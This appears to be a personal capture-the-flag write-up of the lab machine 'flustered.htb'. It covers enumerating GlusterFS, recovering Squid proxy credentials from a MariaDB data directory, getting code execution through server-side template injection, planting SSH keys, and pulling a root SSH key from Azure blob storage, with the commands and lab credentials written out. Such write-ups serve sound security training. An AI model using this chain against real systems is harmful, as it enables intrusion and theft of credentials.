![[Pasted image 20250425164611.png]]
[[nmap]] reports [[port 80]] open but without relevant information.

searching on our browser the [[port 24007]] and we found information `gluster` we can use the tool [[glusterfs]] to enumerate this.

```bash
sudo gluster --remote-host=flustered.htb
```

![[Pasted image 20250425182513.png]]

and we got two volumes, now, we should mount someone on our machine using [[mount]].

```bash
sudo mount -t glusterfs flustered.htb:/vol1
```

but at try the mount is failed, and checking logs we find this:

![[Pasted image 20250425183002.png]]

so we need a cert `glusterfs.pem`.
then we try with `vol2` failed too, but on logs we get this:

![[Pasted image 20250425183150.png]]

so trying add flustered to `/etc/hosts`

![[Pasted image 20250425183923.png]]

and we get that information, lets play with [[Docker]] to create a container with this information and manipulate there.

![[Pasted image 20250425185652.png]]

considering this version of [[mariadb]].

```bash
docker run -d \
	--name mariadb \
	-v ./content/mysql:/var/lib/mysql \
	-v ./content/socket.cnf:/etc/mysql/mariadb.conf.d/socket.cnf \	
	-e MARIADB_ALLOW_EMPTY_ROOT_PASSWORD=1 \
	-p 3306:3306 \
	mariadb:10.3.31
```

once with container create we can enter with interactive mode:

```bash
docker exec --it mariadb bash
```

and checking the database called `squid` we found this:

![[Pasted image 20250425194700.png]]

so that credentials we can use to authenticate to [[squid-http]] proxy on [[port 3128]]

```bash
curl --proxy "http://lance.friedman:o>WJ5-jD<5^m3@flustered.htb:3128" 127.0.0.1
```

![[Pasted image 20250425195216.png]]

and we get access.

with [[gobuster]] we can pass through proxy to with [[fuzzing]] list directories.

```bash
gobuster dir --proxy "http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@flustered.htb:3128" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://127.0.0.1          
```

and we got `app/` directory, let's try scan by extensions `py`

![[Pasted image 20250425195804.png]]

gobuster find `app.py`, download it [[curl]].

![[Pasted image 20250425200036.png]]

```bash
curl --proxy "http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@flustered.htb:3128" http://127.0.0.1/app/app.py > ./content/app.py        
```

![[Pasted image 20250425202538.png]]

basically, the web can receive a parameter `siteurl` by method `POST` and going set on title of the web.

so, we can use [[Burpsuite]] to tunneling that requests and event [[Server Side Template Injection (SSTI)]]

```bash
curl -s -X POST http://flustered.htb -d '{"siteurl":"{{8*8}}"}' -H 'Content-type: application/json' --proxy http://127.0.0.1:8080
```

![[Pasted image 20250425203135.png]]

and get remote execution commands.
with [[Payload All The Things]] we can get remote access

![[Pasted image 20250425203751.png]]

remembering the [[glusterfs]] and `vol1` require `.pem` keys, we can check `/etc/ssl` to find something.

![[Pasted image 20250425204908.png]]

then, copy these files on your host machine in the path `/etc/ssl/`

![[Pasted image 20250425205538.png]]
we mount `vol1` successful. 

![[Pasted image 20250425205649.png]]

looks like home directory from user of target machine.
now, we can create a pair of keys and put the public in `.ssh` directory of the mount.

![[Pasted image 20250425210020.png]]
and we're `jennifer`.

scanning the network we found a container on `172.17.0.2` with port 10000 open.

so using [[ssh]] we can event a local port forwarding to get access to that port.

```bash
ssh jennifer@flustered.htb -L 10000:172.17.0.2:10000
```

with [[nmap]] now we can perform a scan to against our own machine.

searching the error displayed on localhost:10000 we to know are running [[azure storage-explorer]], so with docker we can check it

```bash
docker run --network="host" -it mcr.microsoft.com/azure-cli:2.30.0 bash
```

and using a connection string

```bash
az storage container list --connection-string "DefaultEndpointsProtocol=http;AccountName=jennifer;AccountKey=FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==;BlobEndpoint=http://localhost:10000/jennifer;" --output table
```

the `AccessKey` is in directory `/var/backup/key` of `jennifer` you can find them with [[find]] filtering by name `key`

![[Pasted image 20250425233302.png]]

we got some interesting table called `ssh-keys`

![[Pasted image 20250425233423.png]]

and we can download `root.key`

```bash
az storage blob download --container-name ssh-keys --name root.key --file /tmp/root.txt --connection-string "DefaultEndpointsProtocol=http;AccountName=jennifer;AccountKey=FMinPqwWMtEmmPt2ZJGaU5MVXbKBtaFyqP0Zjohpoh39Bd5Q8vQUjztVfFphk73+I+HCUvNY23lUabd7Fm8zgQ==;BlobEndpoint=http://localhost:10000/jennifer;"
```

![[Pasted image 20250425233716.png]]

that result being the root ssh key, so it's done.